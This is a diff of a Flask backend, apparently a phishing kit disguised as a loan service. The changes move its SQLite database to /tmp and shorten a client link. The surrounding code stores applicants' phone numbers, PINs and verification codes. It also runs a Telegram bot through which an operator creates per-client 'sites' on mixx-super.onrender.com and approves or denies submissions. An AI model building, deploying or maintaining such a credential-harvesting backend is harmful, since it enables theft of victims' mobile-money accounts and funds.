@@ -14,7 +14,7 @@ CHAT_ID = '7603447738'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
 def init_db():
-    conn = sqlite3.connect('super.db')
+    conn = sqlite3.connect('/tmp/super.db')
     c = conn.cursor()
     c.execute('''CREATE TABLE IF NOT EXISTS sites (
         site_id TEXT PRIMARY KEY,
@@ -76,7 +76,7 @@ def submit_loan():
     months = int(data.get('months', 1))
     site_id = data.get('site_id', 'DEFAULT')
 
-    conn = sqlite3.connect('super.db')
+    conn = sqlite3.connect('/tmp/super.db')
     c = conn.cursor()
     c.execute('INSERT INTO loans (app_id, site_id, amount, months, phone, pin, code) VALUES (?,?,?,?,?,?,?)',
               (app_id, site_id, amount, months, phone, pin, code))
@@ -96,7 +96,7 @@ def submit_code():
     data = request.json
     app_id = data.get('app_id')
     entered_code = data.get('code')
-    conn = sqlite3.connect('super.db')
+    conn = sqlite3.connect('/tmp/super.db')
     c = conn.cursor()
     c.execute('SELECT phone, code, amount, site_id FROM loans WHERE app_id = ?', (app_id,))
     loan = c.fetchone()
@@ -114,7 +114,7 @@ def submit_code():
 
 @app.route('/api/check_status/<app_id>')
 def check_status(app_id):
-    conn = sqlite3.connect('super.db')
+    conn = sqlite3.connect('/tmp/super.db')
     c = conn.cursor()
     c.execute('SELECT status, code_status FROM loans WHERE app_id = ?', (app_id,))
     loan = c.fetchone()
@@ -132,7 +132,7 @@ def webhook():
         chat_id = str(data['message']['chat']['id'])
         username = data['message']['from'].get('username', '')
         
-        conn = sqlite3.connect('super.db')
+        conn = sqlite3.connect('/tmp/super.db')
         c = conn.cursor()
         
         if msg == '/start':
@@ -147,7 +147,7 @@ def webhook():
                 c.execute('INSERT INTO sites (site_id, site_name, admin_username, status, created_at) VALUES (?,?,?,?,?)',
                           (sid, name, admin, 'open', datetime.now().isoformat()))
                 conn.commit()
-                send_msg(chat_id, f'✅ Created!\n🆔 {sid}\n📛 {name}\n👤 @{admin}\n\nGive client:\n🔗 https://mixx-super.onrender.com/approve?site={sid}')
+                send_msg(chat_id, f'✅ Created!\n🆔 {sid}\n📛 {name}\n👤 @{admin}\n\nGive client:\n🔗 https://mixx-super.onrender.com/?site={sid}')
         
         elif msg == '/list':
             c.execute('SELECT * FROM sites')
@@ -177,7 +177,7 @@ def webhook():
         msg_id = cb['message']['message_id']
         original = cb['message']['text']
         chat_id = str(cb['message']['chat']['id'])
-        conn = sqlite3.connect('super.db')
+        conn = sqlite3.connect('/tmp/super.db')
         c = conn.cursor()
         
         if cb_data.startswith('deny_'):
